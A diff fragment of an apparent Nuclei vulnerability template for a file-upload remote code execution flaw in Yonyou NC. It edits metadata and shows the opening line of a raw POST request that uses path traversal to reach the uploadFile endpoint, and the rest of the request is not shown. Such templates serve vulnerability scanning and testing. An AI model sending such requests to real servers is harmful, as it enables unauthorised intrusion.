@@ -3,14 +3,8 @@ info:
   name: 用友 NC uploadControluploadFile 文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yqg9nmygauz8vbkd
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yqg9nmygauz8vbkd
-    fofa: icon_hash="1085941792"
 http:
 - raw:
   - 'POST /mp/initcfg/../uploadControl/uploadFile HTTP/1.1
